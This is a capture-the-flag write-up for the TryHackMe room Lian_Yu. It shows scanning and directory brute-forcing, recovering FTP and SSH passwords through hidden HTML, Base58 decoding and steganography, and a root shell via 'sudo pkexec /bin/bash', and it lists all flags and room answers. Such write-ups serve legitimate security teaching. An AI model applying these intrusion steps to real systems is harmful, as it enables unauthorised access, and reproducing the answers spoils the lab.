# 🏹 TryHackMe — Lian_Yu CTF Writeup

![TryHackMe](https://img.shields.io/badge/TryHackMe-Lian__Yu-red?style=for-the-badge&logo=tryhackme)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green?style=for-the-badge)
![Status](https://img.shields.io/badge/Status-Pwned-brightgreen?style=for-the-badge)
![OS](https://img.shields.io/badge/OS-Linux-blue?style=for-the-badge&logo=linux)

> A beginner-level CTF room on TryHackMe themed around the TV show **Arrow**.  
> The objective is to find all flags through enumeration, web exploitation, steganography, and privilege escalation.

---

## 📋 Table of Contents

- [Room Info](#room-info)
- [Tools Used](#tools-used)
- [Step 1 — Nmap Scan](#step-1--nmap-scan)
- [Step 2 — Web Enumeration](#step-2--web-enumeration)
- [Step 3 — Finding the Hidden Ticket](#step-3--finding-the-hidden-ticket)
- [Step 4 — Decoding the Token](#step-4--decoding-the-token)
- [Step 5 — FTP Access](#step-5--ftp-access)
- [Step 6 — File Analysis & Steganography](#step-6--file-analysis--steganography)
- [Step 7 — SSH Login & User Flag](#step-7--ssh-login--user-flag)
- [Step 8 — Privilege Escalation & Root Flag](#step-8--privilege-escalation--root-flag)
- [Flags Summary](#flags-summary)
- [Lessons Learned](#lessons-learned)

---

## 🗺️ Room Info

| Field      | Details                                   |
|------------|-------------------------------------------|
| Room Name  | Lian_Yu                                   |
| Platform   | TryHackMe                                 |
| Difficulty | Easy                                      |
| URL        | https://tryhackme.com/room/lianyu         |
| Theme      | Arrow (TV Show)                           |
| Target IP  | 10.49.159.122                             |

---

## 🛠️ Tools Used

| Tool       | Purpose                          |
|------------|----------------------------------|
| `nmap`     | Port & service scanning          |
| `gobuster` | Web directory enumeration        |
| `ftp`      | Download files from FTP server   |
| `file`     | Identify file types              |
| `xxd`      | Hex inspection of files          |
| `binwalk`  | Binary/file analysis             |
| `steghide` | Extract hidden steganography data|
| `base58`   | Decode Base58 encoded token      |
| `ssh`      | Remote shell access              |
| `sudo`     | Privilege escalation             |

---

## Step 1 — Nmap Scan

```bash
nmap -sC -sV -T4 10.49.159.122
```

**Screenshot:**

![Nmap Scan](lian%20yu/1.png)

**Open Ports:**

| Port | State | Service | Version                        |
|------|-------|---------|--------------------------------|
| 21   | open  | FTP     | vsftpd 3.0.2                   |
| 22   | open  | SSH     | OpenSSH 6.7p1 Debian 5+deb8u8  |
| 80   | open  | HTTP    | Apache httpd                   |
| 111  | open  | rpcbind | 2-4 (RPC #100000)              |

**Key observation:** HTTP title returns **"Purgatory"** — an Arrow TV show reference.

---

## Step 2 — Web Enumeration

### Visiting the Homepage

Navigating to `http://10.49.159.122` showed an **ARROWVERSE** themed page with a story about Oliver Queen.

![Homepage](lian%20yu/2.png)

### Directory Bruteforce

```bash
gobuster dir -u http://10.49.159.122 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

![Gobuster](lian%20yu/3.png)

**Found:** `/island` (Status: 301)

### Visiting /island

Navigating to `http://10.49.159.122/island` showed a page with the codeword hidden.

![Island page](lian%20yu/4.png)

### Viewing Page Source

Checking the page source (`Ctrl+U`) revealed the **codeword hidden in white-coloured text** on line 20:

```html
<h2 style="color:white"> vigilante</h2>
```

Also found an HTML comment: `<!-- go!go!go! -->`

![Page source](lian%20yu/5.png)

> **Codeword (FTP Username): `vigilante`**

---

## Step 3 — Finding the Hidden Ticket

Running Gobuster again on `/island` with `.ticket` extension:

```bash
gobuster dir -u http://10.49.159.122/island -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .ticket
```

![Gobuster ticket](lian%20yu/6.png)

**Found:** `/island/2100` (Status: 301)

### Visiting /island/2100

The page showed an embedded YouTube video titled **"How Oliver Queen finds his way to Lian_Yu?"**

![2100 page](lian%20yu/7.png)

Checking page source revealed a hint: `<!-- you can avail your .ticket here but how? -->`

![2100 source](lian%20yu/8.png)

### Accessing the Ticket File

Navigating directly to `http://10.49.159.122/island/2100/green_arrow.ticket`:

![Ticket](lian%20yu/9.png)

**Token found:** `RTy8yhBQdscX`

> **Ticket filename: `green_arrow.ticket`**

---

## Step 4 — Decoding the Token

The token `RTy8yhBQdscX` is **Base58 encoded**. Decoded using:

```bash
echo "RTy8yhBQdscX" | base58 -d
```

![Base58 decode](lian%20yu/10.png)

> **FTP Password: `!#th3h00d`**

---

## Step 5 — FTP Access

Logged into FTP with the discovered credentials:

```bash
ftp 10.49.159.122
# Username: vigilante
# Password: !#th3h00d
```

![FTP login and listing](lian%20yu/11.png)

**Files found:**
- `Leave_me_alone.png` (511720 bytes)
- `Queen's_Gambit.png` (549924 bytes)
- `aa.jpg` (191026 bytes)

Downloaded all files:

```bash
get Leave_me_alone.png
get Queen's_Gambit.png
get aa.jpg
```

![FTP download](lian%20yu/12.png)

---

## Step 6 — File Analysis & Steganography

### Checking File Types

```bash
file Leave_me_alone.png
file Queen\'s_Gambit.png
file aa.jpg
binwalk Leave_me_alone.png
binwalk Queen\'s_Gambit.png
binwalk aa.jpg
```

![File check](lian%20yu/13.png)

**Key finding:** `Leave_me_alone.png` showed as **"data"** instead of a PNG — its magic bytes were corrupted!

### Inspecting the Corrupted PNG

```bash
xxd Leave_me_alone.png | head -5
```

![xxd output](lian%20yu/14.png)

The file header was `58 45 0a 0d` instead of the correct PNG magic bytes `89 50 4E 47 0D 0A 1A 0A`.

### Fixing the Magic Bytes

```bash
printf '\x89\x50\x4e\x47\x0d\x0a\x1a\x0a' | dd of=Leave_me_alone.png bs=1 seek=0 conv=notrunc
file Leave_me_alone.png
```

![Fixed PNG](lian%20yu/15.png)

File now correctly identified as: `PNG image data, 845 x 475, 8-bit/color RGBA`

### Opening the Image

Opening `Leave_me_alone.png` revealed the **steghide passphrase** written in the image:

![Leave me alone image](lian%20yu/16.png)

> **Steghide Passphrase: `password`**

### Extracting Hidden Data

```bash
steghide extract -sf aa.jpg -p "password"
```

![Steghide extract](lian%20yu/17.png)

**Extracted:** `ss.zip`

### Unzipping

```bash
unzip ss.zip
```

![Unzip](lian%20yu/18.png)

**Files extracted:** `passwd.txt` and `shado`

### Reading the Files

```bash
cat passwd.txt
cat shado
```

![Cat files](lian%20yu/19.png)

- `passwd.txt` — A decoy story about Oliver Queen on the island
- `shado` — Contains the SSH password: **`M3tahuman`**

> **SSH Password File: `shado`**  
> **SSH Password: `M3tahuman`**

---

## Step 7 — SSH Login & User Flag

```bash
ssh slade@10.49.159.122
# Password: M3tahuman
```

Accepted the host fingerprint and logged in successfully with the **WELCOME2 LIAN_YU** banner:

![SSH login](lian%20yu/20.png)

### Getting the User Flag

```bash
ls
cat user.txt
```

![User flag](lian%20yu/21.png)

> **User Flag: `THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}`**  
> *— Felicity Smoak*

---

## Step 8 — Privilege Escalation & Root Flag

### Checking Sudo Permissions

```bash
sudo -l
```

![Sudo -l](lian%20yu/22.png)

**Output:**
```
User slade may run the following commands on LianYu:
    (root) PASSWD: /usr/bin/pkexec
```

### Escalating to Root

`pkexec` can be used to execute commands as root. Used it to spawn a bash shell:

```bash
sudo pkexec /bin/bash
```

Got a root shell immediately! Then read the root flag:

```bash
cat /root/root.txt
```

![Root flag](lian%20yu/22.png)

> **Root Flag: `THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}`**  
> *— DEATHSTROKE*

---

## 🚩 Flags Summary

| Question                          | Answer                                                                                                        |
|-----------------------------------|---------------------------------------------------------------------------------------------------------------|
| Web directory (number)            | `2100`                                                                                                        |
| Ticket filename                   | `green_arrow.ticket`                                                                                          |
| FTP Password                      | `!#th3h00d`                                                                                                   |
| File with SSH password            | `shado`                                                                                                       |
| User Flag (`user.txt`)            | `THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}`                                                                  |
| Root Flag (`root.txt`)            | `THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}`                |

---

## 📚 Lessons Learned

1. **Hidden text in HTML** — Always view page source; codewords can be hidden using `color:white` CSS tricks
2. **File magic bytes** — A file's extension doesn't define its type; always use `file` and `xxd` to verify
3. **Steganography** — Images can contain hidden data; `steghide` with the right passphrase reveals it
4. **Base58 encoding** — Common CTF encoding; looks like a random alphanumeric string
5. **sudo -l is your friend** — Always check sudo permissions first for privilege escalation
6. **pkexec privesc** — If a user can run `pkexec` as root, it can be used to spawn a root shell

---

*Writeup by: izzul harith*  
*Date: June 2026*  
*Platform: TryHackMe | Room: Lian_Yu | Difficulty: Easy*
